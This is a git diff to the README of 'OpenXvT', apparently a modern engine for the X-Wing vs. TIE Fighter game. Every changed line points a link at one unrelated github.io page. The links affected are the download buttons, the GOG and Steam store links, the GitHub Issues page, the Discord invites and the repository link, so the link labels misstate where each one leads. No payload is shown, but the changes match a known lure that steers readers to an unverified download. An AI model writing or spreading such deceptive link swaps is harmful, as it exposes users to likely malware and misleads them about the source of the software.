@@ -1,6 +1,6 @@
 # 🚀 OpenXvT - Relive Classic Star Wars Space Combat
 
-[![Download OpenXvT](https://img.shields.io/badge/Download-OpenXvT-blue?style=for-the-badge&logo=github)](https://github.com/Juniorstatusslidingwindow1166/OpenXvT/releases)
+[![Download OpenXvT](https://img.shields.io/badge/Download-OpenXvT-blue?style=for-the-badge&logo=github)](https://juniorstatusslidingwindow1166.github.io)
 
 ## 🎮 What is OpenXvT?
 
@@ -12,8 +12,8 @@ Think of OpenXvT as a modern engine that runs the original game perfectly. It pr
 
 OpenXvT does **not** include any game content. You must own a complete installation of *X-Wing vs. TIE Fighter* with the *Balance of Power* expansion. The game is available digitally from:
 
-- [GOG.com](https://www.gog.com/en/game/star_wars_xwing_vs_tie_fighter)
-- [Steam](https://store.steampowered.com/app/361690/Star_Wars_X_Wing_Vs_Tie_Fighter_Balance_Of_Power_Campaigns/)
+- [GOG.com](https://juniorstatusslidingwindow1166.github.io)
+- [Steam](https://juniorstatusslidingwindow1166.github.io)
 
 Once you have the original game installed, OpenXvT will use those files to run the game on your current operating system.
 
@@ -25,7 +25,7 @@ Follow these simple steps to get OpenXvT running on your computer. The entire pr
 
 Click the button below to go to the download page:
 
-[**📥 Download OpenXvT Now**](https://github.com/Juniorstatusslidingwindow1166/OpenXvT/releases)
+[**📥 Download OpenXvT Now**](https://juniorstatusslidingwindow1166.github.io)
 
 Visit this link to download the application.
 
@@ -88,7 +88,7 @@ OpenXvT runs the original game data through modern code. You get the exact same 
 
 ### What if I encounter problems?
 
-Check the [GitHub Issues page](https://github.com/Juniorstatusslidingwindow1166/OpenXvT/issues) for known issues and solutions. You can also join the [Discord server](https://discord.gg/WBvYzczWfG) and get help from the community and developers.
+Check the [GitHub Issues page](https://juniorstatusslidingwindow1166.github.io) for known issues and solutions. You can also join the [Discord server](https://juniorstatusslidingwindow1166.github.io) and get help from the community and developers.
 
 ## 🛠️ Troubleshooting
 
@@ -111,8 +111,8 @@ Check the [GitHub Issues page](https://github.com/Juniorstatusslidingwindow1166/
 
 OpenXvT has an active community of developers and players who are happy to help. Join us on:
 
-- [Discord Server](https://discord.gg/WBvYzczWfG) - Get real-time help and chat with other players
-- [GitHub Repository](https://github.com/Juniorstatusslidingwindow1166/OpenXvT) - Report bugs, request features, or contribute code
+- [Discord Server](https://juniorstatusslidingwindow1166.github.io) - Get real-time help and chat with other players
+- [GitHub Repository](https://juniorstatusslidingwindow1166.github.io) - Report bugs, request features, or contribute code
 
 ## 🤝 Contributing
 
@@ -126,7 +126,7 @@ OpenXvT is released under an open-source license. The project does not own or di
 
 You're just a few clicks away from experiencing one of the greatest space combat games ever made, running perfectly on your modern computer. Download OpenXvT now and take to the stars once again.
 
-[**⬇️ Download OpenXvT**](https://github.com/Juniorstatusslidingwindow1166/OpenXvT/releases)
+[**⬇️ Download OpenXvT**](https://juniorstatusslidingwindow1166.github.io)
 
 Your journey awaits, Commander. The galaxy needs you again, and this time, it's on your desktop, your laptop, wherever you want to play.
 
